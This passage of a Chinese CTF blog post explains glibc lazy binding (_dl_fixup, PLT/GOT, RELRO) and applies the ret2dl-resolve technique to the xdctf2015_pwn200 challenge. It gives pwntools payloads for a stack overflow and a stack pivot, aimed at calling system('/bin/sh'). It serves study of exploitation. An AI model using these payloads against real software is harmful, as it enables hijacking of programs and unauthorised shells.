<span class="number">0xf7fb6e0c</span>, <span class="number">0xf7fb6e14</span>, <span class="number">0xf7fb6df4</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf7fb6dfc</span>, <span class="number">0x0</span>, <span class="number">0xf7fb6da4</span>, <span class="number">0x0</span>, <span class="number">0xf7fb6dac</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf7fb6e2c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf7fb6e3c</span>, <span class="number">0xf7fb6e34</span>, <span class="number">0xf7fb6e24</span>, <span class="number">0xf7fb6e1c</span>, <span class="number">0x0</span>, <span class="number">0xf7fb6e4c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf7fb6e44</span>, <span class="number">0x0</span> &lt;repeats <span class="number">25</span> times&gt;, <span class="number">0xf7fb6dbc</span>&#125;, </span><br><span class="line">  l_phdr = <span class="number">0xf7ddf034</span>, </span><br><span class="line">  l_entry = <span class="number">0xf7df8130</span>, </span><br><span class="line">  l_phnum = <span class="number">0xa</span>, </span><br><span class="line">  l_ldnum = <span class="number">0x1e</span>, </span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>知道libc的地址后，可以继续查找printf的真实地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment">	 of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment">	 offset.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">				   sym ? (LOOKUP_VALUE_ADDRESS (result)</span><br><span class="line">					  + sym-&gt;st_value) : <span class="number">0</span>);   <span class="comment">//将sym-&gt;st_value和LOOKUP_VALUE_ADDRESS(result)相加就是函数的真实地址：0xf7ddf000+0x51520 =0xf7e2a430</span></span><br><span class="line">#LOOKUP_VALUE_ADDRESS的宏定义如下：</span><br><span class="line"><span class="comment">//glibc-2.27/sysdeps/generic/ldsodefs.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOOKUP_VALUE_ADDRESS(map) ((map) ? (map)-&gt;l_addr : 0) <span class="comment">//可以看到LOOKUP_VALUE_ADDRESS(result)和result-&gt;l_addr等价 0xf7ddf000</span></span></span><br><span class="line"><span class="comment">//sym的st_value成员是所求符号的偏移地址：</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; p sym</span><br><span class="line">$<span class="number">2</span> = (<span class="keyword">const</span> Elf32_Sym *) <span class="number">0xf7de5ab4</span></span><br><span class="line">pwndbg&gt; p/x *sym</span><br><span class="line">$<span class="number">3</span> = &#123;</span><br><span class="line">  st_name = <span class="number">0x551</span>, </span><br><span class="line">  st_value = <span class="number">0x51520</span>, </span><br><span class="line">  st_size = <span class="number">0x2a</span>, </span><br><span class="line">  st_info = <span class="number">0x12</span>, </span><br><span class="line">  st_other = <span class="number">0x0</span>, </span><br><span class="line">  st_shndx = <span class="number">0xd</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到sym-&gt;st_value保存的是符号printf的偏移地址，加上libc基地址之后就是printf函数在内存中的真实地址，最终调用elf_machine_fixup_plt函数向此符号的got表中填写函数的真实地址即可.</p>
<p>__dl_fixup的源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">	   struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab</span></span><br><span class="line"><span class="function">    </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);  <span class="comment">//取出.dynsym</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);            <span class="comment">//取出.dynstr</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc</span><br><span class="line">    = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);               <span class="comment">//取出Elf_Rel</span></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];                  <span class="comment">//取出Elf_Sym</span></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *refsym </span>= sym;</span><br><span class="line">  <span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);            <span class="comment">//对应GOT地址</span></span><br><span class="line">  <span class="keyword">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);               <span class="comment">//检查是否等于7</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don&#x27;t look in the global scope.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">	    (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);                <span class="comment">//查找vernum</span></span><br><span class="line">	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;                     <span class="comment">//查找ndx</span></span><br><span class="line">	  version = &amp;l-&gt;l_versions[ndx];  <span class="comment">//查找当前解析符号的版本信息version</span></span><br><span class="line">	  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">	    version = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment">	 not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment">	 we are not using any threads (yet).  */</span></span><br><span class="line">      <span class="keyword">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">	&#123;</span><br><span class="line">	  THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">	  flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">				    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);        <span class="comment">//找到包含对应符号的对象(libc),返回一个指向其基地址的指针</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">	THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment">	 of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment">	 offset.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">				   sym ? (LOOKUP_VALUE_ADDRESS (result)</span><br><span class="line">					  + sym-&gt;st_value) : <span class="number">0</span>);  <span class="comment">//获得函数的真实内存地址</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment">	 address) is also known.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">  value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);  <span class="comment">//写入GOT</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="过程总结"><a href="#过程总结" class="headerlink" title="过程总结"></a>过程总结</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reloc_arg 和reloc_index 的关系如下：</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> reloc_offset</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> reloc_offset reloc_arg</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> reloc_index  reloc_arg / sizeof (PLTREL)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>当调用一个属于动态链接库的函数时，首先进入该函数的plt表（有三条汇编指令），执行第一条汇编指令jmp ptr（ptr指向该函数对应的got表，got表中存放的内容为.plt+6)。如果该函数不是第一次调用，则jmp之后会直接跳转到 函数的真实地址执行该函数。如果该函数时第一次调用，则jmp后会来到.plt+6，即第二条指令： push，x（x对应该函数在.rel.plt(ELF JMPREL Relocation Table)中的偏移参数reloc_index)</p>
</li>
<li><p>执行push指令后，跳转到<code>.plt</code> 段的开头,即 PLT[0]。PLT[0] 处的代码将 GOT[1] 的值压入栈中，然后跳转到 GOT[2]。 GOT[1]与GOT[2]这两个 GOT 表条目有着特殊的含义。</p>
<p>​    GOT[1]：一个指向内部数据结构的指针，类型是 <code>link_map</code>，在动态装载器内部使用，包含了进行符号解析需要的当前 ELF 对象的信息。在它的<code>l_info</code> 域中保存了<code>.dynamic</code> 段中大多数条目的指针构成的一个数组。</p>
<p>​    GOT[2]：一个指向动态装载器中 <code>_dl_runtime_resolve</code> 函数的指针。</p>
<p>所以这步，PLT[0] 其实就是调用<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code></p>
<p><code>_dl_runtime_resolve</code>函数使用参数<code>link_map_obj</code>来获取解析导入函数（使用<code>reloc_index</code>参数标识）需要的信息，并将结果写到正确的 GOT 条目中。在 <code>_dl_runtime_resolve</code>解析完成后，控制流就交到了那个函数手里，而下次再调用函数的 plt 时，就会直接进入目标函数中执行。</p>
</li>
<li><p>在<code>_dl_runtime_resolve</code>中会调用函数<code>_dl_fixup(link_map, reloc_arg)</code>中去寻找动态链接库在内存中的基地址和和该符号的真实地址</p>
</li>
<li><ul>
<li><p>在第一个link_map中的l_ld或者l_info成员中记录了_DYNAMIC节中每个ELF32_Dyn的所在地址。通过对应的宏定义索引得到.dynsym（ELF Symbol Table）、.dynstr（ELF String Table）和.rel.plt（ELF JMPREL Relocation Table）的起始地址。</p>
<blockquote>
<ul>
<li>.dynsym位于.dynamic的8*9+4=76=0x4c  </li>
<li>.dynstr位于.dynamic的8*8+4=68=0x44</li>
<li>.rel.plt位于.dynamic的16*8+4=132=0x84</li>
</ul>
</blockquote>
</li>
<li><p>然后将.rel.plt的起始地址与传入的_dl_fixup函数的reloc_offset(即reloc_arg)相加得到该符号的Elf_Rel结构体的指针地址</p>
</li>
<li><p>使用该符号的Elf32_rel结构体r-&gt;info成员，（reloc-&gt;r_info)&gt;&gt;8的值当作索引寻找该符号在ELF Symbol Table中的结构体Elf32_Sym地址</p>
</li>
<li><p>第一个link_map结构体成员的l-&gt;l_addr始终为0，与Elf32_Rel结构体的reloc-&gt;r_offset成员相加就是该符号的.got.plt地址</p>
</li>
<li><p>安全性检查：检查reloc-&gt;r_info成员的最低位是否是0x7，如果不是触发assert断言。</p>
</li>
<li><p>使用 <code>l_info[VERSYMIDX (DT_VERSYM)]</code>和<code>vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff</code>分别查找vernum、ndx。然后使用这两个结果查找当前解析符号的版本信息：version(version可能为0)</p>
<blockquote>
<p>const ElfW(Half) *vernum =</p>
<pre><code>    (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;
  version = &amp;l-&gt;l_versions[ndx];
</code></pre>
</blockquote>
</li>
<li><p>调用_dl_lookup_symbol_x查找符号所在动态链接库的link_map。这里使用该符号对应的ELF String Table即.dynstr section的指针来进行查找，函数返回的result中的l-&gt;l_addr是动态链接库的基地址</p>
<blockquote>
<p>result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</p>
<pre><code>                version, ELF_RTYPE_CLASS_PLT, flags, NULL);   
</code></pre>
</blockquote>
</li>
<li><p>将sym-&gt;st_value（函数在动态链接库中的偏移）和l-&gt;addr相加就是所找符号的真实地址（DL_FIXUP_MAKE_VALUE）</p>
</li>
<li><p>调用elf_machine_fixup_plt向符号的got表中填写函数的真实地址</p>
</li>
</ul>
</li>
<li><p>在_dl_runtime_resolve返回后调用该符号</p>
</li>
</ul>
<p>此外，由于RELRO保护机制会影响延迟绑定，因此也会影响ret2dl-resolve：</p>
<ul>
<li><p>Partial RELRO：包括.dynamic段在内的一些段会被标识为只读。</p>
</li>
<li><p>Full RELRO：在Partial RELRO的基础上，禁用延迟绑定，即所有的导入符号在加载时就被解析，.got.plt段被完全初始化为目标函数的地址，并标记为只读。</p>
</li>
</ul>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>掌握了基础知识，下面我们来看论文里提出的两个简单攻击场</p>
<p>景，如图10-12所示。</p>
<p>（1）关闭RELRO保护，使.dynamic段可写时：由于动态装载器是从.dynamic段的DT_STRTAB条目中来获取.dynstr段的地址，而DT_STRTAB的位置是已知的，且默认情况下可写，所以攻击者能够改写DT_STRTAB的内容，欺骗动态装载器，使它以为.dynstr段在.bss上，同时在那里伪造一个假的字符串表。当动态装载器尝试解析printf()时就会使用不同的基地址来寻找函数名，最终执行的是execve()。 </p>
<p>（2）开启Partial RELRO保护，使.dynamic段不可写时：我们知道_dl_runtime_resolve()的第二个参数reloc_index对应Elf_Rel在.rel.plt段中的偏移，动态装载器将其加上.rel.plt的基地址来得到目标Elf_Rel的内存地址。然而，当这个内存地址超出了.rel.plt段，并最终落在.bss段中时，攻击者就可以在那里伪造一个Elf_Rel，使r_offset的值是一个可写的内存地址来将解析后的函数地址写在那里。同理，使r_info的值是一个能够将动态装载器导向到攻击者控制内存的下标，指向一个位于它后面的Elf_Sym，而Elf_Sym中的st_name指向它后面的函数名字符串。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236513.png" alt="image-20220628165933686"></p>
<p>​      其他更复杂的攻击场景，包括修改GOT[1]的link_map对象，以及绕过Full RELRO的方法等，可以阅读论文进一步了解。</p>
<table>
<thead>
<tr>
<th></th>
<th>no-RELRO</th>
<th>Partial-RELRO</th>
<th>Full-RELRO</th>
</tr>
</thead>
<tbody><tr>
<td>.dynamic</td>
<td>可写</td>
<td>只读</td>
<td>只读</td>
</tr>
<tr>
<td>.got.plt</td>
<td>可写</td>
<td>可写</td>
<td>只读</td>
</tr>
<tr>
<td>.got</td>
<td>可写</td>
<td>只读</td>
<td>只读</td>
</tr>
</tbody></table>
<ul>
<li>事实上，虚拟地址是从<code>st_name</code>得来的，只要我们能够修改这个<code>st_name</code>的内容就可以执行任意函数，比如把<code>st_name</code>的内容修改为<code>&quot;system&quot;</code></li>
<li><code>reloc_index</code>即参数<code>n</code>是我们可以控制的，我们需要做的事通过一系列操作，把<code>reloc_index</code>可控转化为<code>st_name</code>可控；我们需要在一个可写地址上构造一系列伪结构就可以完成利用或在条件允许的情况下直接修改<code>.dynstr</code></li>
<li>所以我们需要在程序中找一段空间<code>start</code>出来，放我们直接构造的<code>fake_dynsym</code>，<code>fake_dynstr</code>和<code>fake_rel_plt</code>等，然后利用栈迁移到手法将栈转移到<code>start</code></li>
</ul>
<h3 id="例题xdctf2015-pwn200"><a href="#例题xdctf2015-pwn200" class="headerlink" title="例题xdctf2015_pwn200"></a>例题xdctf2015_pwn200</h3><h4 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h4><h4 id="保护检查"><a href="#保护检查" class="headerlink" title="保护检查"></a>保护检查</h4><p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236514.png" alt="image-20220628173421213"></p>
<h4 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">112</span>]; <span class="comment">// [esp+0h] [ebp-7Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> *p_argc; <span class="comment">// [esp+70h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, <span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf[<span class="number">24</span>], <span class="number">0</span>, <span class="number">0x4C</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  write(<span class="number">1</span>, buf, v3);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">104</span>]; <span class="comment">// [esp+Ch] [ebp-6Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序中存在栈溢出漏洞，vuln()函数试图读取256个字节到100字节大小的缓冲区。没有canary的保护，我们可以 轻松覆盖返回地址，从而劫持执行流。程序中的write()函数可用于信息泄露。</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="stage1"><a href="#stage1" class="headerlink" title="stage1"></a><strong>stage1</strong></h5><p>由于程序启用了Partial RELRO，所以我们应该采用第二种攻击 场景。首先是利用栈溢出控制执行流，调用read()函数将下一阶段的payload读到.bss段上，然后用stack pivot将栈转移过去。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">base_addr = bss_addr + <span class="number">0x800</span>    <span class="comment"># 0x804a628</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)                </span><br><span class="line">payload1+=p32(read_plt)              <span class="comment">#read(0,bss_addr,100)</span></span><br><span class="line">payload1+=p32(ppp_addr)              <span class="comment">#clean the stack </span></span><br><span class="line">payload1+=p32(<span class="number">0</span>)+p32(base_addr)+p32(<span class="number">100</span>)</span><br><span class="line">payload1+=p32(ebp_ret)</span><br><span class="line">payload1+=p32(base_addr)              <span class="comment">#ebp</span></span><br><span class="line">payload1+=p32(leave_ret)             <span class="comment">#mov esp,ebp;pop ebp;pop eip</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接下来，我们从一个调用write(1, “/bin/sh”, 7)的第二阶段payload开始，一步步将其改造成ret2dl-resolve的payload，最终目的是实现调用system(“/bin/sh”)，每一步打印出的字符串也有利于验证。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">base_addr = bss_addr + <span class="number">0x800</span>    <span class="comment"># 0x804a628</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)                </span><br><span class="line">payload1+=p32(read_plt)              <span class="comment">#read(0,bss_addr,100)</span></span><br><span class="line">payload1+=p32(ppp_addr)              <span class="comment">#clean the stack </span></span><br><span class="line">payload1+=p32(<span class="number">0</span>)+p32(base_addr)+p32(<span class="number">100</span>)</span><br><span class="line">payload1+=p32(ebp_ret)</span><br><span class="line">payload1+=p32(base_addr)              <span class="comment">#ebp</span></span><br><span class="line">payload1+=p32(leave_ret)             <span class="comment">#mov esp,ebp;pop ebp;pop eip</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&quot;AAAA&quot;</span></span><br><span class="line">payload2+=p32(write_plt)            <span class="comment">#write(1,&quot;/bin/sh\x00&quot;,8)</span></span><br><span class="line">payload2+=<span class="string">&quot;AAAA&quot;</span></span><br><span class="line">payload2+=p32(<span class="number">1</span>)+p32(base_addr+<span class="number">80</span>)+p32(<span class="built_in">len</span>(<span class="string">&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">payload2+=<span class="string">&quot;a&quot;</span>*(<span class="number">80</span>-<span class="built_in">len</span>(payload2))   <span class="comment">#padding 80  </span></span><br><span class="line">payload2+=<span class="string">&quot;/bin/sh\x00&quot;</span>            <span class="comment">#base_addr+80</span></span><br><span class="line">payload2+=<span class="string">&quot;a&quot;</span>*(<span class="number">100</span>-<span class="built_in">len</span>(payload2))  <span class="comment">#padding 100</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236515.png" alt="image-20220628200118221"></p>
<h5 id="stage2"><a href="#stage2" class="headerlink" title="stage2"></a><strong>stage2</strong></h5><p>这次控制<code>eip</code>返回<code>PLT[0]</code>，要带上write的<code>index_offset</code>。这里修改一下payload2  </p>
